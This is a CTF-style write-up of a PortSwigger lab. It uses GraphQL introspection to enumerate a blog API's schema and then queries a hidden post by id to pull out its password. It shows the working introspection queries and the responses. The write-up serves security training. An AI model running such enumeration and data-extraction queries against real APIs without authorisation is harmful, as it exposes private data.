# Accessing private GraphQL posts

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts), you'll learn: Enumerating GraphQL schema using introspection! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password.

We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to modify GraphQL queries in Repeater, and enables you to scan the API schema.

For more information on using InQL, see [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/working-with-graphql).

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-1/images/Pasted%20image%2020230705122349.png)

In here, we can view some blog posts.

**View source page:**
```html
[...]
<script src="/resources/js/gqlUtil.js"></script>
<script src="/resources/js/blogSummaryGql.js"></script>
<script>displayContent('/post', 'postId')</script>
[...]
```

In the index page, we can see that 2 JavaScript files were imported, and called function `displayContent()`.

**`/resources/js/blogSummaryGql.js`:**
```js
const OPERATION_NAME = 'getBlogSummaries';

const QUERY = `
query ${OPERATION_NAME} {
    getAllBlogPosts {
        image
        title
        summary
        id
    }
}`;

const QUERY_BODY = {
    query: QUERY,
    operationName: OPERATION_NAME
};

const UNEXPECTED_ERROR = 'Unexpected error while trying to retrieve blog posts';

const displayErrorMessages = (...messages) => {
    const blogList = document.getElementById('blog-list');
    messages.forEach(message => {
        const errorDiv = document.createElement("div");
        errorDiv.setAttribute("class", "error-message");

        const error = document.createElement("p");
        error.setAttribute("class", "is-warning");
        error.textContent = message;

        errorDiv.appendChild(error);
        blogList.appendChild(errorDiv);
    });
};

const displayBlogSummaries = (path, queryParam) => (data) => {
    const parent = document.getElementById('blog-list');

    const blogPosts = data['getAllBlogPosts'];
    if (!blogPosts && blogPost !== []) {
        displayErrorMessages(UNEXPECTED_ERROR);
        return;
    }

    blogPosts.forEach(blogPost => {
        const blogPostElement = document.createElement('div');
        blogPostElement.setAttribute('class', 'blog-post');

        const id = blogPost['id']
        const blogPostPath = `${path}?${queryParam}=${id}`;

        const image = document.createElement('img');
        image.setAttribute('src', blogPost['image']);

        const aTag = document.createElement('a');
        aTag.setAttribute('href', blogPostPath);
        aTag.appendChild(image);

        blogPostElement.appendChild(aTag);

        const title = document.createElement('h2');
        title.textContent = blogPost['title'];
        blogPostElement.appendChild(title);

        const summary = document.createElement('p');
        summary.textContent = blogPost['summary'];
        blogPostElement.appendChild(summary);

        const button = document.createElement('a');
        button.setAttribute('class', 'button is-small');
        button.setAttribute('href', blogPostPath);
        button.textContent = 'View post';
        blogPostElement.appendChild(button);

        parent.appendChild(blogPostElement);
    });
};

const displayContent = (path, queryParam) => {
    sendQuery(QUERY_BODY, displayBlogSummaries(path, queryParam), handleErrors(displayErrorMessages), () => displayErrorMessages(UNEXPECTED_ERROR));
}
```

Basically what function `displayContent` does is to prepare the GraphQL `getBlogSummaries` *query* with query name `getAllBlogPosts`, and only return `image`, `title`, `summary`, and `id` results.

When the results are returned, it'll append those results to the index page using DOM (Document Object Model).

**`/resources/js/gqlUtil.js`:**
```js
[...]
const sendQuery = (query, onGet, onErrors, onException) => {
    fetch(
            '/graphql/v1',
            {
                method: 'POST',
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                body: JSON.stringify(query)
            }
        )
        .then(response => response.json())
        .then(response => {
            const errors = response['errors'];
            if (errors) {
                onErrors(...errors);
            } else {
                onGet(response['data']);
            }
        })
        .catch(onException);
};
```

This `sendQuery` function will send a POST request to **`/graphql/v1` endpoint** with the body of the prepared GraphQL `getBlogSummaries` query.

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-1/images/Pasted%20image%2020230705123944.png)

GraphQL is an API query language that is designed to facilitate efficient communication between clients and servers. It enables the user to specify exactly what data they want in the response, helping to avoid the large response objects and multiple calls that can sometimes be seen with REST APIs.

GraphQL services define a contract through which a client can communicate with a server. The client doesn't need to know where the data resides. Instead, clients send queries to a GraphQL server, which fetches data from the relevant places. As GraphQL is platform-agnostic, it can be implemented with a wide range of programming languages and can be used to communicate with virtually any data store.

In GraphQL, GraphQL queries retrieve data from the data store.

**In our case, the query is this:**
```graphql
query getBlogSummaries {
    getAllBlogPosts {
        image
        title
        summary
        id
    }
}
```

This `getBlogSummaries` query requests the `image`, `title`, `summary`, `id` of all blog posts.

But before we test the `getBlogSummaries` query, we can try to probe for **introspection**.

Introspection is a built-in GraphQL function that enables you to query a server for information about the schema. It is commonly used by applications such as GraphQL IDEs and documentation generation tools.

Like regular queries, you can specify the fields and structure of the response you want to be returned. For example, you might want the response to only contain the names of available mutations.

Introspection can represent a serious [information disclosure](https://portswigger.net/web-security/information-disclosure) risk, as it can be used to access potentially sensitive information (such as field descriptions) and help an attacker to learn how they can interact with the API. It is best practice for introspection to be disabled in production environments.

**We can use the following introspection probe query:**
```graphql
query {__schema{queryType{name}}}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-1/images/Pasted%20image%2020230705125433.png)

**As you can see, the web server respond us with this JSON object:**
```json
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "query"
      }
    }
  }
}
```

That being said, **introspection is enabled** in the web application!

**Now, we can use the following full introspection query to enumerate the entire GraphQL schema:**
```graphql
query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
         ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
        }
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-1/images/Pasted%20image%2020230705125924.png)

**It should returned tons of stuff, however we can just focus on the following JSON data:**
```json
[...]
"types": [
    {
      "kind": "OBJECT",
      "name": "BlogPost",
      "description": null,
      "fields": [
        {
          "name": "id",
          "description": null,
          "args": [],
          "type": {
            "kind": "NON_NULL",
            "name": null,
            "ofType": {
              "kind": "SCALAR",
              "name": "Int",
              "ofType": null
            }
          },
          "isDeprecated": false,
          "deprecationReason": null
        },
        {
          "name": "image",
          "description": null,
          "args": [],
          "type": {
            "kind": "NON_NULL",
            "name": null,
            "ofType": {
              "kind": "SCALAR",
              "name": "String",
              "ofType": null
            }
          },
          "isDeprecated": false,
          "deprecationReason": null
        },
        {
          "name": "title",
          "description": null,
          "args": [],
          "type": {
            "kind": "NON_NULL",
            "name": null,
            "ofType": {
              "kind": "SCALAR",
              "name": "String",
              "ofType": null
            }
          },
          "isDeprecated": false,
          "deprecationReason": null
        },
        {
          "name": "author",
          "description": null,
          "args": [],
          "type": {
            "kind": "NON_NULL",
            "name": null,
            "ofType": {
              "kind": "SCALAR",
              "name": "String",
              "ofType": null
            }
          },
          "isDeprecated": false,
          "deprecationReason": null
        },
        {
          "name": "date",
          "description": null,
          "args": [],
          "type": {
            "kind": "NON_NULL",
            "name": null,
            "ofType": {
              "kind": "SCALAR",
              "name": "Timestamp",
              "ofType": null
            }
          },
          "isDeprecated": false,
          "deprecationReason": null
        },
        {
          "name": "summary",
          "description": null,
          "args": [],
          "type": {
            "kind": "NON_NULL",
            "name": null,
            "ofType": {
              "kind": "SCALAR",
              "name": "String",
              "ofType": null
            }
          },
          "isDeprecated": false,
          "deprecationReason": null
        },
        {
          "name": "paragraphs",
          "description": null,
          "args": [],
          "type": {
            "kind": "NON_NULL",
            "name": null,
            "ofType": {
              "kind": "LIST",
              "name": null,
              "ofType": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "String"
                }
              }
            }
          },
          "isDeprecated": false,
          "deprecationReason": null
        },
        {
          "name": "isPrivate",
          "description": null,
          "args": [],
          "type": {
            "kind": "NON_NULL",
            "name": null,
            "ofType": {
              "kind": "SCALAR",
              "name": "Boolean",
              "ofType": null
            }
          },
          "isDeprecated": false,
          "deprecationReason": null
        },
        {
          "name": "postPassword",
          "description": null,
          "args": [],
          "type": {
            "kind": "SCALAR",
            "name": "String",
            "ofType": null
          },
          "isDeprecated": false,
          "deprecationReason": null
        }
      ],
      "inputFields": null,
      "interfaces": [],
      "enumValues": null,
      "possibleTypes": null
    }
    [...]
    {
      "kind": "OBJECT",
      "name": "query",
      "description": null,
      "fields": [
        {
          "name": "getBlogPost",
          "description": null,
          "args": [
            {
              "name": "id",
              "description": null,
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "Int",
                  "ofType": null
                }
              },
              "defaultValue": null
            }
          ],
          "type": {
            "kind": "OBJECT",
            "name": "BlogPost",
            "ofType": null
          },
          "isDeprecated": false,
          "deprecationReason": null
        },
        {
          "name": "getAllBlogPosts",
          "description": null,
          "args": [],
          "type": {
            "kind": "NON_NULL",
            "name": null,
            "ofType": {
              "kind": "LIST",
              "name": null,
              "ofType": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "OBJECT",
                  "name": "BlogPost"
                }
              }
            }
          },
          "isDeprecated": false,
          "deprecationReason": null
        }
      ],
      "inputFields": null,
      "interfaces": [],
      "enumValues": null,
      "possibleTypes": null
    }
  ]
  [...]
```

In GraphQL, the schema represents a contract between the frontend and backend of the service. It defines the data available as a series of types, using a human-readable schema definition language. These types can then be implemented by a service.

Most of the types defined are object types. which define the objects available and the fields and arguments they have. Each field has its own type, which can either be another object or a scalar, enum, union, interface, or custom type.

In the above respond, there's a type called `BlogPost`, and it has field `id`, `image`, `title`, `author`, `date`, `summary`, `paragraphs`, `isPrivate`, and `postPassword`:

**Type `BlogPost` in GraphQL:**
```graphql
type BlogPost {
    id: ID!
    image: String!
    title: String!
    author: String!
    date: Timestamp!
    summary: String!
    paragraphs: [String!]! 
    isPrivate: Boolean!
    postPassword: String
}
```

**Also, there's 2 queries we can send to the GraphQL API: `getBlogPost` and `getAllBlogPosts`**
```graphql
query {
    getBlogPost(id: 1337) {
        image
        title
        summary
        id
    }
}
```

```graphql
query {
    getAllBlogPosts {
        image
        title
        summary
        id
    }
}
```

Armed with above information, we can try to retrieve all data via `getAllBlogPosts` query **with all fields**:

```graphql
query giveMeAllTheFieldsOfAllPosts{
    getAllBlogPosts {
        id
        image
        title
        author
        date
        summary
        paragraphs 
        isPrivate
        postPassword
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-1/images/Pasted%20image%2020230705132546.png)

> Note: I'm using an extension called "InQL" to modify GraphQL queries easier.

**Response:**
```json
{
  "data": {
    "getAllBlogPosts": [
      {
        "id": 1,
        "image": "/image/blog/posts/23.jpg",
        "title": "The Peopleless Circus",
        "author": "Si Test",
        "date": "2023-06-08T13:25:51.560Z",
        "summary": "[...]",
        "paragraphs": [
          [...]
        ],
        "isPrivate": false,
        "postPassword": null
      },
      {
        "id": 2,
        "image": "/image/blog/posts/28.jpg",
        "title": "The history of swigging port",
        "author": "Ivor Lemon",
        "date": "2023-06-10T07:18:18.371Z",
        "summary": "[...]",
        "paragraphs": [
          [...]
        ],
        "isPrivate": false,
        "postPassword": null
      },
      {
        "id": 5,
        "image": "/image/blog/posts/4.jpg",
        "title": "Cell Phone Free Zones",
        "author": "Paul Totherone",
        "date": "2023-06-12T14:27:04.253Z",
        "summary": "[...]",
        "paragraphs": [
          [...]
        ],
        "isPrivate": false,
        "postPassword": null
      },
      {
        "id": 4,
        "image": "/image/blog/posts/26.jpg",
        "title": "Trying To Save The World",
        "author": "Sam Sandwich",
        "date": "2023-06-19T06:14:58.971Z",
        "summary": "[...]",
        "paragraphs": [
          [...]
        ],
        "isPrivate": false,
        "postPassword": null
      }
    ]
  }
}
```

As you can see, we got blog post id `1`, `2`, `4`, `5`.

Uh... The id 3 is missing?

Also, field `isPrivate` and `postPassword` is all `false` and `null`.

With that said, **blog post id `3` must be interesting for us, maybe it is a private post**.

**To do so, we can use the `getBlogPost` query with argument `id` to try to get blog post id `3`:**
```graphql
query privatePostPls{
    getBlogPost(id: 3) {
        id
        image
        title
        author
        date
        summary
        paragraphs 
        isPrivate
        postPassword
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-1/images/Pasted%20image%2020230705133222.png)

**Nice! We can retrieve blog post id `3`!**
```json
{
  "data": {
    "getBlogPost": {
      "id": 3,
      "image": "/image/blog/posts/35.jpg",
      "title": "Hobbies",
      "author": "Carrie Atune",
      "date": "2023-06-14T15:18:33.831Z",
      "summary": "[...]",
      "paragraphs": [
        [...]
      ],
      "isPrivate": true,
      "postPassword": "bxx5ej6gdpza9tzqd750x05zfiuku61k"
    }
  }
}
```

Yep! Blog post id `3` is indeed a private post, and we got it's password!

Let's submit it!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-1/images/Pasted%20image%2020230705133337.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-1/images/Pasted%20image%2020230705133350.png)

# What we've learned:

1. Enumerating GraphQL schema using introspection